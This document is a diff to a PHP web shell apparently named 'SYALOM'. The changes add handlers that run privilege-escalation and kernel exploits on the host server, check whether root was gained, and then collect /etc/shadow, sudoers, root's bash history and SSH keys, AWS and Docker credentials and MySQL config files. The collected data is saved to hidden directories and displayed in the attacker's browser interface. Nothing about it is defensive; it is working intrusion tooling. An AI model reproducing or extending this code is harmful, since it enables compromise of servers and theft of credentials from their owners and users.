@@ -1182,6 +1182,111 @@ if (isset($_POST['action']) && $_POST['action'] === 'privesc_exploit') {
     exit;
 }
 
+// 🎯 AUTO-COLLECT ROOT DATA: Execute exploit AND auto-collect critical data in ONE request
+if (isset($_POST['action']) && $_POST['action'] === 'auto_collect_root_data') {
+    try {
+        header('Content-Type: application/json');
+        $method = $_POST['method'] ?? '';
+        $target = $_POST['target'] ?? '';
+        
+        // Step 1: Execute the exploit
+        $exploit_result = execute_privesc_exploit($method, $target);
+        
+        if (!$exploit_result['success']) {
+            echo json_encode([
+                'success' => false,
+                'output' => $exploit_result['output'] ?? 'Exploit failed',
+                'stage' => 'exploit'
+            ]);
+            exit;
+        }
+        
+        // Step 2: Verify we have root (2 of 3 checks must pass)
+        $root_verified = verify_root_access_internal();
+        
+        if (!$root_verified) {
+            echo json_encode([
+                'success' => false,
+                'output' => $exploit_result['output'] . "\n[!] Exploit executed but root NOT verified",
+                'stage' => 'verification',
+                'raw_output' => $exploit_result['output']
+            ]);
+            exit;
+        }
+        
+        // Step 3: 🎯 ROOT CONFIRMED! Auto-collect all critical data NOW
+        // (root access only exists in this request!)
+        $collected_data = collect_critical_root_data();
+        
+        // Save to accessible location for display
+        $save_result = save_collected_root_data($collected_data);
+        
+        echo json_encode([
+            'success' => true,
+            'output' => $exploit_result['output'] . "\n[+] 🎯 AUTO-COLLECT COMPLETE! Root data saved",
+            'stage' => 'collected',
+            'collected' => $collected_data,
+            'saved_to' => $save_result['paths'] ?? [],
+            'summary' => $save_result['summary'] ?? ''
+        ]);
+        
+    } catch (Exception $e) {
+        safe_json_error('Auto-collect failed', $e->getMessage());
+    }
+    exit;
+}
+
+// 🎯 KERNEL EXPLOIT WITH AUTO-COLLECT: Execute kernel exploit AND auto-collect in ONE request
+if (isset($_POST['action']) && $_POST['action'] === 'kernel_exploit_auto_collect') {
+    try {
+        header('Content-Type: application/json');
+        $binary_path = $_POST['binary'] ?? '';
+        $method = $_POST['method'] ?? 'binary';
+        
+        if (!$binary_path || !file_exists($binary_path)) {
+            echo json_encode(['success' => false, 'output' => 'Binary not found: ' . $binary_path]);
+            exit;
+        }
+        
+        // Step 1: Execute the kernel exploit binary
+        $output = '';
+        if ($method === 'python') {
+            $output = execute_shell_command("python3 $binary_path 2>&1 || python $binary_path 2>&1");
+        } else {
+            $output = execute_shell_command("$binary_path 2>&1");
+        }
+        
+        // Step 2: Verify we have root (2 of 3 checks must pass)
+        $root_verified = verify_root_access_internal();
+        
+        if (!$root_verified) {
+            echo json_encode([
+                'success' => false,
+                'output' => $output . "\n[!] Kernel exploit executed but root NOT verified",
+                'stage' => 'verification'
+            ]);
+            exit;
+        }
+        
+        // Step 3: 🎯 ROOT CONFIRMED! Auto-collect all critical data NOW
+        $collected_data = collect_critical_root_data();
+        $save_result = save_collected_root_data($collected_data);
+        
+        echo json_encode([
+            'success' => true,
+            'output' => $output . "\n[+] 🎯 AUTO-COLLECT COMPLETE! Root data saved",
+            'stage' => 'collected',
+            'collected' => $collected_data,
+            'saved_to' => $save_result['paths'] ?? [],
+            'summary' => $save_result['summary'] ?? ''
+        ]);
+        
+    } catch (Exception $e) {
+        safe_json_error('Kernel auto-collect failed', $e->getMessage());
+    }
+    exit;
+}
+
 if (isset($_POST['action']) && $_POST['action'] === 'install_persistence') {
     try {
         header('Content-Type: application/json');
@@ -2592,6 +2697,179 @@ __attribute__((constructor)) void init() {
     return $result;
 }
 
+// =============================================================================
+// 🎯 AUTO-COLLECT ROOT DATA FUNCTIONS
+// Execute exploit AND collect critical data in ONE request (root is temporary!)
+// =============================================================================
+
+// Internal verification (no HTTP calls - called within same request)
+function verify_root_access_internal() {
+    $root_count = 0;
+    $checks = [
+        'id' => 'uid=0(root)',
+        'whoami' => 'root',
+        'cat /proc/self/status 2>/dev/null | grep Uid' => 'Uid:\t0'
+    ];
+    
+    foreach ($checks as $cmd => $expect) {
+        $output = execute_shell_command($cmd . ' 2>&1');
+        if (strpos($output, $expect) !== false) {
+            $root_count++;
+        }
+    }
+    
+    // Must pass at least 2 of 3 checks
+    return $root_count >= 2;
+}
+
+// Collect ALL critical data while we still have root access
+function collect_critical_root_data() {
+    $data = [];
+    $timestamp = date('Y-m-d H:i:s');
+    
+    // 🎯 CRITICAL IDENTITY COMMANDS
+    $data['identity'] = [
+        'timestamp' => $timestamp,
+        'id' => execute_shell_command('id 2>&1'),
+        'whoami' => execute_shell_command('whoami 2>&1'),
+        'hostname' => execute_shell_command('hostname 2>&1'),
+        'uname' => execute_shell_command('uname -a 2>&1'),
+    ];
+    
+    // 🎯 PASSWORD FILES
+    $data['passwords'] = [
+        'etc_shadow' => execute_shell_command('cat /etc/shadow 2>&1'),
+        'etc_passwd' => execute_shell_command('cat /etc/passwd 2>&1'),
+        'etc_group' => execute_shell_command('cat /etc/group 2>&1'),
+        'sudoers' => execute_shell_command('cat /etc/sudoers 2>&1'),
+        'sudoers_d' => execute_shell_command('ls -la /etc/sudoers.d/ 2>&1'),
+    ];
+    
+    // 🎯 ROOT DIRECTORY
+    $data['root_dir'] = [
+        'ls_la_root' => execute_shell_command('ls -la /root/ 2>&1'),
+        'ls_a_root' => execute_shell_command('ls -a /root/ 2>&1'),
+        'root_bash_history' => execute_shell_command('cat /root/.bash_history 2>&1 | tail -100'),
+        'root_ssh' => execute_shell_command('ls -la /root/.ssh/ 2>&1'),
+        'root_authorized_keys' => execute_shell_command('cat /root/.ssh/authorized_keys 2>&1'),
+    ];
+    
+    // 🎯 SYSTEM INFO
+    $data['system'] = [
+        'ps_aux_root' => execute_shell_command('ps aux 2>&1 | grep -E "^root" | head -20'),
+        'netstat' => execute_shell_command('netstat -tulpn 2>&1 | head -20'),
+        'ss' => execute_shell_command('ss -tulpn 2>&1 | head -20'),
+        'iptables' => execute_shell_command('iptables -L 2>&1 | head -30'),
+        'crontab_root' => execute_shell_command('crontab -l 2>&1'),
+        'crontab_etc' => execute_shell_command('ls -la /etc/cron* 2>&1'),
+    ];
+    
+    // 🎯 SENSITIVE FILES
+    $data['sensitive'] = [
+        'mysql_root_my_cnf' => execute_shell_command('cat /root/.my.cnf 2>&1'),
+        'mysql_user_my_cnf' => execute_shell_command('cat ~/.my.cnf 2>&1'),
+        'aws_credentials' => execute_shell_command('cat /root/.aws/credentials 2>&1'),
+        'docker_config' => execute_shell_command('cat /root/.docker/config.json 2>&1'),
+        'ssh_host_keys' => execute_shell_command('ls -la /etc/ssh/ssh_host_* 2>&1'),
+    ];
+    
+    // 🎯 ENVIRONMENT
+    $data['environment'] = [
+        'env' => execute_shell_command('env 2>&1'),
+        'printenv' => execute_shell_command('printenv 2>&1'),
+        'path' => execute_shell_command('echo $PATH 2>&1'),
+    ];
+    
+    // 🎯 NETWORK
+    $data['network'] = [
+        'ifconfig' => execute_shell_command('ifconfig -a 2>&1'),
+        'ip_addr' => execute_shell_command('ip addr 2>&1'),
+        'route' => execute_shell_command('route -n 2>&1'),
+        'resolv_conf' => execute_shell_command('cat /etc/resolv.conf 2>&1'),
+        'hosts' => execute_shell_command('cat /etc/hosts 2>&1'),
+    ];
+    
+    // 🎯 INSTALLED SOFTWARE
+    $data['software'] = [
+        'which_sudo' => execute_shell_command('which sudo 2>&1'),
+        'which_python' => execute_shell_command('which python python3 2>&1'),
+        'which_perl' => execute_shell_command('which perl 2>&1'),
+        'which_nc' => execute_shell_command('which nc nc.traditional 2>&1'),
+        'which_nmap' => execute_shell_command('which nmap 2>&1'),
+        'which_gcc' => execute_shell_command('which gcc cc clang tcc 2>&1'),
+        'dpkg' => execute_shell_command('dpkg -l 2>&1 | head -30'),
+        'rpm' => execute_shell_command('rpm -qa 2>&1 | head -30'),
+    ];
+    
+    return $data;
+}
+
+// Save collected data to accessible location
+function save_collected_root_data($data) {
+    $timestamp = time();
+    $saved_paths = [];
+    $summary_parts = [];
+    
+    // Find writable directories
+    $writable_dirs = find_writable_directories();
+    $base_dir = !empty($writable_dirs) ? reset($writable_dirs) : sys_get_temp_dir();
+    
+    // Create data directory
+    $data_dir = $base_dir . '/.root_data_' . $timestamp;
+    @mkdir($data_dir, 0755, true);
+    
+    // Save as formatted text for easy reading
+    $text_output = "=== ROOT DATA COLLECTION ===\n";
+    $text_output .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
+    $text_output .= "Hostname: " . ($data['identity']['hostname'] ?? 'unknown') . "\n";
+    $text_output .= "========================================\n\n";
+    
+    foreach ($data as $category => $items) {
+        $text_output .= "\n=== $category ===\n";
+        foreach ($items as $name => $value) {
+            $text_output .= "\n--- $name ---\n";
+            $text_output .= $value . "\n";
+            
+            // Count non-empty results for summary
+            if (!empty(trim($value)) && strpos($value, 'No such file') === false && 
+                strpos($value, 'Permission denied') === false) {
+                $summary_parts[] = "$category/$name";
+            }
+        }
+    }
+    
+    // Save text version
+    $text_file = $data_dir . '/root_data.txt';
+    if (@file_put_contents($text_file, $text_output)) {
+        $saved_paths[] = $text_file;
+    }
+    
+    // Save JSON version for programmatic access
+    $json_file = $data_dir . '/root_data.json';
+    if (@file_put_contents($json_file, json_encode($data, JSON_PRETTY_PRINT))) {
+        $saved_paths[] = $json_file;
+    }
+    
+    // Create summary file
+    $summary = "Collected: " . count($summary_parts) . " items\n";
+    $summary .= "Categories: " . implode(', ', array_keys($data)) . "\n";
+    $summary .= "Successful commands: " . implode(', ', array_slice($summary_parts, 0, 10));
+    if (count($summary_parts) > 10) {
+        $summary .= " (+" . (count($summary_parts) - 10) . " more)";
+    }
+    
+    $summary_file = $data_dir . '/summary.txt';
+    @file_put_contents($summary_file, $summary);
+    $saved_paths[] = $summary_file;
+    
+    return [
+        'paths' => $saved_paths,
+        'summary' => $summary,
+        'dir' => $data_dir,
+        'count' => count($summary_parts)
+    ];
+}
+
 // Helper function: Find writable directories for backup storage
 function find_writable_directories() {
     $writable_dirs = [];
@@ -3523,7 +3801,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 2014</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 2128</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -6410,24 +6688,30 @@ async function autoGetRoot() {
                 if (compileData.success && compileData.compiled_binary) {
                     log('[+] Kernel compiled: ' + compileData.compiled_binary, 'success');
                     
-                    // Execute compiled binary
-                    let execCmd = compileData.compiled_binary;
-                    if (compileData.method === 'python') {
-                        execCmd = 'python3 ' + execCmd + ' || python ' + execCmd;
-                    }
+                    // 🎯 Execute kernel exploit WITH auto-collect in ONE request!
+                    const kernelForm = new FormData();
+                    kernelForm.append('action', 'kernel_exploit_auto_collect');
+                    kernelForm.append('binary', compileData.compiled_binary);
+                    kernelForm.append('method', compileData.method || 'binary');
                     
-                    const execForm = new FormData();
-                    execForm.append('cmd', execCmd);
-                    execForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+                    const kernelResp = await fetch('', { method: 'POST', body: kernelForm });
+                    const kernelData = await kernelResp.json();
                     
-                    await fetch('', { method: 'POST', body: execForm });
-                    
-                    // Verify root
-                    const isRoot = await verifyRootAccess();
-                    if (isRoot) {
+                    if (kernelData.success && kernelData.collected) {
+                        // 🎉 ROOT OBTAINED + DATA AUTO-COLLECTED!
                         rootObtained = true;
                         log('[+] 🎉 ROOT via KERNEL: ' + exploit.name, 'success');
+                        log('[+] 🎯 Auto-collected critical root data!', 'success');
+                        
+                        // Store collected data
+                        window.lastCollectedRootData = kernelData.collected;
+                        window.lastCollectedSummary = kernelData.summary;
+                        window.lastCollectedPaths = kernelData.saved_to;
+                        
+                        updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✅ ROOT+COLLECTED', 'kernel', 'success');
                         break;
+                    } else {
+                        log('[!] Kernel exploit executed but root NOT verified', 'warn');
                     }
                 } else {
                     log('[!] Kernel compile failed: ' + (compileData.output || 'Unknown error'), 'error');
@@ -6452,51 +6736,39 @@ async function autoGetRoot() {
         log('[*] [' + attempts + '/' + maxAttempts + '] Trying ' + exploit.type.toUpperCase() + ': ' + exploit.name);
         
         try {
-            const formData = new FormData();
-            formData.append('action', 'privesc_exploit');
-            formData.append('method', exploit.type);
-            formData.append('target', exploit.data.payload || exploit.data);
+            // 🎯 Use auto-collect: exploit + verify + collect in ONE request!
+            // This is CRITICAL because root access only exists within single HTTP request
+            updateExploitProgress(attempts, maxAttempts, exploit.name + ' (auto-collect...)', exploit.type, 'running');
             
-            const execResponse = await fetch('', { method: 'POST', body: formData });
-            const execData = await execResponse.json();
+            const result = await tryExploitWithAutoCollect(exploit, log);
             
-            if (execData.success) {
-                updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✓ EXECUTED', exploit.type, 'success');
-                log('[+] Exploit executed: ' + exploit.name, 'success');
+            if (result.success && result.collected) {
+                // 🎉 ROOT OBTAINED + DATA AUTO-COLLECTED!
+                rootObtained = true;
+                updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✅ ROOT+COLLECTED', exploit.type, 'success');
                 
-                // IMMEDIATELY verify if root obtained - DOUBLE CHECK
-                const isRoot = await verifyRootAccess();
+                log('[+] 🎉🎉🎉 ROOT OBTAINED ON ATTEMPT ' + attempts + '! 🎉🎉🎉', 'success');
+                log('[+] Vector: ' + exploit.type.toUpperCase() + ' - ' + exploit.name);
+                log('[+] 🎯 Auto-collected critical root data!', 'success');
                 
-                if (isRoot) {
-                    // Double verification to prevent false positive
-                    const doubleCheck = await verifyRootAccess();
-                    if (doubleCheck) {
-                        rootObtained = true;
-                        log('[+] 🎉🎉🎉 ROOT OBTAINED ON ATTEMPT ' + attempts + '! 🎉🎉🎉', 'success');
-                        log('[+] Vector: ' + exploit.type.toUpperCase() + ' - ' + exploit.name);
-                        log('[+] ✅ Double verification passed!', 'success');
-                        
-                        // Update final success status
-                        statusDiv.innerHTML = `
-                            <div style="text-align:center;padding:10px;">
-                                <div style="font-size:24px;margin-bottom:10px;">🎉</div>
-                                <div style="color:#0f0;font-weight:bold;font-size:14px;">ROOT OBTAINED!</div>
-                                <div style="color:#888;font-size:11px;margin-top:5px;">${exploit.type.toUpperCase()} - ${exploit.name}</div>
-                                <div style="color:#6cf;font-size:10px;margin-top:5px;">Attempt ${attempts} of ${maxAttempts}</div>
-                            </div>
-                        `;
-                        break; // STOP - we got root!
-                    } else {
-                        log('[!] ⚠️ First check passed but double-check failed (inconsistent)', 'warn');
-                        updateExploitProgress(attempts, maxAttempts, exploit.name + ' ? INCONSISTENT', exploit.type, 'failed');
-                    }
-                } else {
-                    updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✓ (no root yet)', exploit.type, 'failed');
-                    log('[!] Exploit executed but no root yet, continuing...', 'warn');
-                }
+                // Update final success status
+                statusDiv.innerHTML = `
+                    <div style="text-align:center;padding:10px;">
+                        <div style="font-size:24px;margin-bottom:10px;">🎉</div>
+                        <div style="color:#0f0;font-weight:bold;font-size:14px;">ROOT OBTAINED!</div>
+                        <div style="color:#888;font-size:11px;margin-top:5px;">${exploit.type.toUpperCase()} - ${exploit.name}</div>
+                        <div style="color:#6cf;font-size:10px;margin-top:5px;">Attempt ${attempts} of ${maxAttempts}</div>
+                        <div style="color:#0f0;font-size:10px;margin-top:3px;">✅ Auto-collected root data</div>
+                    </div>
+                `;
+                break; // STOP - we got root!
+            } else if (result.data?.stage === 'verification') {
+                // Exploit executed but root verification failed
+                updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✓ (no root yet)', exploit.type, 'failed');
+                log('[!] Exploit executed but root NOT verified, continuing...', 'warn');
             } else {
                 updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✗ FAILED', exploit.type, 'failed');
-                log('[-] Failed: ' + (execData.output?.substring(0, 100) || 'No output'), 'error');
+                log('[-] Failed: ' + (result.error?.substring(0, 100) || 'No output'), 'error');
             }
         } catch (err) {
             updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✗ ERROR', exploit.type, 'failed');
@@ -6522,35 +6794,38 @@ async function autoGetRoot() {
             </div>
         `;
         
-        // Try SUID + Sudo chain
+        // Try SUID + Sudo chain with auto-collect
         const suidExp = allExploits.find(e => e.type === 'suid');
         const sudoExp = allExploits.find(e => e.type === 'sudo');
         
         if (suidExp && sudoExp) {
-            log('[*] Trying SUID→SUDO chain...');
+            log('[*] Trying SUID→SUDO chain with auto-collect...');
             statusDiv.innerHTML = `
                 <div style="padding:10px;">
                     <div style="color:#f80;font-weight:bold;">⏳ CHAIN: SUID → SUDO</div>
                     <div style="color:#6cf;font-size:11px;margin-top:5px;">Step 1/2: Executing SUID exploit...</div>
                 </div>
             `;
-            // First SUID
-            await tryExploit(suidExp);
-            await new Promise(r => setTimeout(r, 1000));
-            
-            statusDiv.innerHTML = `
-                <div style="padding:10px;">
-                    <div style="color:#f80;font-weight:bold;">⏳ CHAIN: SUID → SUDO</div>
-                    <div style="color:#6cf;font-size:11px;margin-top:5px;">Step 2/2: Executing SUDO exploit...</div>
-                </div>
-            `;
-            // Then SUDO
-            await tryExploit(sudoExp);
-            
-            const isRoot = await verifyRootAccess();
-            if (isRoot) {
+            // First SUID with auto-collect
+            const suidResult = await tryExploitWithAutoCollect(suidExp, log);
+            if (suidResult.success) {
                 rootObtained = true;
-                log('[+] 🎉 ROOT via CHAIN ATTACK!', 'success');
+                log('[+] 🎉 ROOT via SUID in chain!', 'success');
+            } else {
+                await new Promise(r => setTimeout(r, 1000));
+                
+                statusDiv.innerHTML = `
+                    <div style="padding:10px;">
+                        <div style="color:#f80;font-weight:bold;">⏳ CHAIN: SUID → SUDO</div>
+                        <div style="color:#6cf;font-size:11px;margin-top:5px;">Step 2/2: Executing SUDO exploit...</div>
+                    </div>
+                `;
+                // Then SUDO with auto-collect
+                const sudoResult = await tryExploitWithAutoCollect(sudoExp, log);
+                if (sudoResult.success) {
+                    rootObtained = true;
+                    log('[+] 🎉 ROOT via SUDO in chain!', 'success');
+                }
             }
         }
     }
@@ -6587,6 +6862,14 @@ async function autoGetRoot() {
         showRootTerminal();
         log('[*] 🎯 Interactive Root Terminal activated!', 'success');
         
+        // 🎯 DISPLAY AUTO-COLLECTED ROOT DATA
+        if (window.lastCollectedRootData) {
+            log('\n[*] =========================================');
+            log('[*] 📁 AUTO-COLLECTED ROOT DATA:', 'success');
+            log('[*] =========================================');
+            displayCollectedRootData(window.lastCollectedRootData, log);
+        }
+        
         log('\n[*] =========================================');
         log('[*] ✅ BRUTAL AUTO-ROOT COMPLETE!', 'success');
         log('[*] Total attempts: ' + attempts);
@@ -6610,7 +6893,7 @@ async function autoGetRoot() {
     }
 }
 
-// Helper: Try single exploit
+// Helper: Try single exploit (basic - no auto-collect)
 async function tryExploit(exploit) {
     try {
         const formData = new FormData();
@@ -6624,6 +6907,104 @@ async function tryExploit(exploit) {
     } catch (e) {
         return false;
     }
+}
+
+// 🎯 Helper: Try exploit WITH auto-collect root data (execute + collect in one request!)
+async function tryExploitWithAutoCollect(exploit, log) {
+    try {
+        log('[*] Executing exploit with auto-collect...', 'info');
+        
+        const formData = new FormData();
+        formData.append('action', 'auto_collect_root_data');  // 🎯 Key: use auto-collect action
+        formData.append('method', exploit.type);
+        formData.append('target', exploit.data.payload || exploit.data);
+        
+        const response = await fetch('', { method: 'POST', body: formData });
+        const data = await response.json();
+        
+        if (data.success && data.collected) {
+            // 🎯 ROOT OBTAINED + DATA COLLECTED!
+            log('[+] ✅ ROOT CONFIRMED!', 'success');
+            log('[+] 🎯 Auto-collected ' + (data.summary || 'critical data'), 'success');
+            
+            // Store collected data for display
+            window.lastCollectedRootData = data.collected;
+            window.lastCollectedSummary = data.summary;
+            window.lastCollectedPaths = data.saved_to;
+            
+            return { success: true, collected: data.collected, data: data };
+        }
+        
+        return { success: false, error: data.output || 'Exploit failed' };
+    } catch (e) {
+        return { success: false, error: e.message };
+    }
+}
+
+// 🎯 Display auto-collected root data in the log
+function displayCollectedRootData(data, log) {
+    if (!data) return;
+    
+    // Identity
+    if (data.identity) {
+        log('[+] === IDENTITY ===', 'success');
+        log('    ID: ' + (data.identity.id || 'N/A').substring(0, 60));
+        log('    Whoami: ' + (data.identity.whoami || 'N/A'));
+        log('    Hostname: ' + (data.identity.hostname || 'N/A'));
+    }
+    
+    // Passwords - highlight if shadow is readable
+    if (data.passwords) {
+        const shadow = data.passwords.etc_shadow || '';
+        if (shadow.includes(':') && !shadow.includes('Permission denied')) {
+            log('[+] ✅ /etc/shadow READABLE!', 'success');
+            const lines = shadow.trim().split('\n').slice(0, 5);
+            lines.forEach(line => log('    ' + line.substring(0, 70)));
+            if (shadow.split('\n').length > 5) {
+                log('    ... (' + (shadow.split('\n').length - 5) + ' more lines)');
+            }
+        } else {
+            log('[!] /etc/shadow: ' + shadow.substring(0, 60));
+        }
+        
+        const passwd = data.passwords.etc_passwd || '';
+        if (passwd.includes(':')) {
+            const userCount = passwd.trim().split('\n').length;
+            log('[+] /etc/passwd: ' + userCount + ' users');
+        }
+    }
+    
+    // Root directory
+    if (data.root_dir) {
+        const rootLs = data.root_dir.ls_la_root || '';
+        if (rootLs && !rootLs.includes('Permission denied')) {
+            log('[+] ✅ /root/ accessible!', 'success');
+            const items = rootLs.trim().split('\n').slice(0, 8);
+            items.forEach(item => log('    ' + item.substring(0, 70)));
+        }
+    }
+    
+    // Network
+    if (data.network) {
+        const ports = data.network.netstat || data.network.ss || '';
+        if (ports) {
+            log('[+] Listening ports:');
+            const lines = ports.trim().split('\n').slice(0, 5);
+            lines.forEach(line => log('    ' + line.substring(0, 70)));
+        }
+    }
+    
+    // System processes
+    if (data.system) {
+        const procs = data.system.ps_aux_root || '';
+        if (procs) {
+            log('[+] Root processes:');
+            const lines = procs.trim().split('\n').slice(0, 5);
+            lines.forEach(line => log('    ' + line.substring(0, 70)));
+        }
+    }
+    
+    log('[*] Full data saved to: ' + (window.lastCollectedPaths?.join(', ') || 'server'));
 }
 
 // Helper: Quick root verification
